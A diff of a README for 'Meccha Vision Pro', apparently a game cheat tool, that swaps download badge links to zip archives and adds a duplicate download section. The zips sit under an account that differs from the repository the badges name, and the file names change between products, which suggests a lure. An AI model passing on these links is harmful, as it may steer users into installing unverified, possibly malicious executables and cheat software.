@@ -9,8 +9,8 @@
 
 ## 📥 Download
 
-[![Download Now](https://img.shields.io/badge/Download-Latest_Release-brightgreen?style=for-the-badge&logo=github)](https://github.com/furexecutorday5/meccha-vision-pro/releases/download/MecchaVisionPlus/chameleon.vision.v1.2.5.zip)
-[![Downloads](https://img.shields.io/github/downloads/fairemperorpath/Meccha-Vision-Pro/total?style=for-the-badge&color=blue)](https://github.com/furexecutorday5/meccha-vision-pro/releases/download/MecchaVisionPlus/chameleon.vision.v1.2.5.zip)
+[![Download Now](https://img.shields.io/badge/Download-Latest_Release-brightgreen?style=for-the-badge&logo=github)](https://github.com/furexecutorday5/meccha-vision-pro/releases/download/MecchaVisionPlus/meccha.vision.v.1.2.zip)
+[![Downloads](https://img.shields.io/github/downloads/fairemperorpath/Meccha-Vision-Pro/total?style=for-the-badge&color=blue)](https://github.com/furexecutorday5/meccha-vision-pro/releases/download/MecchaVisionPlus/meccha.vision.v.1.2.zip)
 [![Stars](https://img.shields.io/github/stars/fairemperorpath/Meccha-Vision-Pro?style=for-the-badge&color=yellow)](https://github.com/fairemperorpath/Meccha-Vision-Pro/stargazers)
 
 ---
@@ -73,8 +73,10 @@
 ---
 
 ## 🛡️ Security
-[![Download Now](https://img.shields.io/badge/Download-Latest_Release-brightgreen?style=for-the-badge&logo=github)](https://github.com/furexecutorday5/meccha-vision-pro/releases/download/MecchaVisionPlus/chameleon.vision.v1.2.5.zip)
-[![Downloads](https://img.shields.io/github/downloads/fairemperorpath/Meccha-Vision-Pro/total?style=for-the-badge&color=blue)](https://github.com/furexecutorday5/meccha-vision-pro/releases/download/MecchaVisionPlus/chameleon.vision.v1.2.5.zip)
+## 📥 Download
+
+[![Download Now](https://img.shields.io/badge/Download-Latest_Release-brightgreen?style=for-the-badge&logo=github)](https://github.com/furexecutorday5/meccha-vision-pro/releases/download/MecchaVisionPlus/meccha.vision.v.1.2.zip)
+[![Downloads](https://img.shields.io/github/downloads/fairemperorpath/Meccha-Vision-Pro/total?style=for-the-badge&color=blue)](https://github.com/furexecutorday5/meccha-vision-pro/releases/download/MecchaVisionPlus/meccha.vision.v.1.2.zip)
 [![Stars](https://img.shields.io/github/stars/fairemperorpath/Meccha-Vision-Pro?style=for-the-badge&color=yellow)](https://github.com/fairemperorpath/Meccha-Vision-Pro/stargazers)
 
 - Pattern Scanning – Auto-updates offsets
